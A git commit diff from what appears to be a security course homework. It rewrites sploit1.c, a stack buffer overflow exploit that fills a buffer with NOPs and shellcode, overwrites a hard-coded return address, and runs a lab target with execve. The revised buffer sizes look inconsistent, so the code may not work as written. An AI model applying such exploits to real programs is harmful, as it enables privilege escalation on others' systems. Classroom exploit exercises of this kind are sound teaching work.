09020f24e04b82de69aeb23714a15f70c72275fd
justinhalford <justinhalford@gmail.com>
2024-05-09 22:42:34 -0400

    may 7

--- cs5435-hw4/sploits/sploit1.c
+++ cs5435-hw4/sploits/sploit1.c
@@ -7,35 +7,31 @@
 
 #define TARGET "/srv/target1"
 
-int main(void) {
-    char *args[3];
-    char *env[1];
+const int BUFFER_SIZE = 20;
+const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
+const int RETURN_ADDRESS_OFFSET = 16;
+const char* RETURN_ADDRESS = 0xffffd6bc;
 
-    int buffsize = 328; // Adjust if necessary based on further stack analysis
-    char exploit[buffsize];
-    int i;
+int main(void)
+{
+  char *args[3];
+  char *env[1];
 
-    // Fill the buffer with NOPs
-    memset(exploit, 0x90, buffsize);
+  char buf[BUFFER_SIZE];
+  memset(buf, 0x90, BUFFER_SIZE);
+  memcpy(buf, shellcode, SHELLCODE_LENGTH);
 
-    // Copy the shellcode in the middle of the NOP sled
-    memcpy(exploit + 90, shellcode, sizeof(shellcode) - 1);
+  *(char**)(buf + RETURN_ADDRESS_OFFSET) = (char*)RETURN_ADDRESS;
 
-    // Overwrite the return address
-    // Choose an address in the NOP sled; change if you find the exact address needed
-    uint32_t ret_addr = 0xffffd600; // Adjust based on your stack analysis
-    for (i = 292; i < buffsize; i += 4) {
-        *(uint32_t *)(exploit + i) = ret_addr;
-    }
+  args[0] = TARGET;
+  args[1] = buf;
+  args[2] = NULL;
+  
+  env[0] = NULL;
+  execve(TARGET, args, env);
+  fprintf(stderr, "execve failed.\n");
 
-    args[0] = TARGET;
-    args[1] = exploit;
-    args[2] = NULL;
-
-    env[0] = NULL;
-
-    execve(TARGET, args, env);
-    fprintf(stderr, "execve failed.\n");
-
-    return 0;
+  return 0;
 }
+
+
